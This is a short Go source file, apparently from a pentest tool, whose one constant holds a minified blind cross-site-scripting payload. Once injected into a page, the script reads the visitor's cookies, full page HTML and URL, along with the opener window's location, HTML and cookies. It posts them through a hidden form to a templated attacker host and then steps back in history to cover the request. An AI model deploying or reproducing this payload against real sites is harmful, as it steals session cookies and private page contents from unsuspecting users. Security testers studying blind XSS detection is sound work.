package blindxss

// Payload is the xss payload used for detection and info-gathering
var Payload = `!function(){if("__"!==window.name){try{dcoo=document.cookie}catch(t){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(t){inne=null}try{durl=document.URL}catch(t){durl=null}try{oloc=opener.location}catch(t){oloc=null}try{oloh=opener.document.body.innerHTML}catch(t){oloh=null}try{odoc=opener.document.cookie}catch(t){odoc=null}var t=document.createElementNS("http://www.w3.org/1999/xhtml","iframe");t.setAttribute("style","display:none"),t.setAttribute("name","hidden-form");var e=document.createElementNS("http://www.w3.org/1999/xhtml","form");e.setAttribute("target","hidden-form");var o=document.createElementNS("http://www.w3.org/1999/xhtml","input"),n=document.createElementNS("http://www.w3.org/1999/xhtml","input"),l=document.createElementNS("http://www.w3.org/1999/xhtml","input"),a=document.createElementNS("http://www.w3.org/1999/xhtml","input"),c=document.createElementNS("http://www.w3.org/1999/xhtml","input"),r=document.createElementNS("http://www.w3.org/1999/xhtml","input");o.setAttribute("value",escape(dcoo)),n.setAttribute("value",escape(inne)),l.setAttribute("value",escape(durl)),a.setAttribute("value",escape(oloc)),c.setAttribute("value",escape(oloh)),r.setAttribute("value",escape(odoc)),o.setAttribute("name","dcoo"),n.setAttribute("name","inne"),l.setAttribute("name","durl"),a.setAttribute("name","oloc"),c.setAttribute("name","oloh"),r.setAttribute("name","odoc"),e.appendChild(o),e.appendChild(n),e.appendChild(l),e.appendChild(c),e.appendChild(a),e.appendChild(r);var d=document.getElementsByTagName("body")[0];e.action="{{host}}",e.method="post",e.target="_blank",d.appendChild(e),window.name="__",e.submit(),history.back()}else window.name=""}();
`
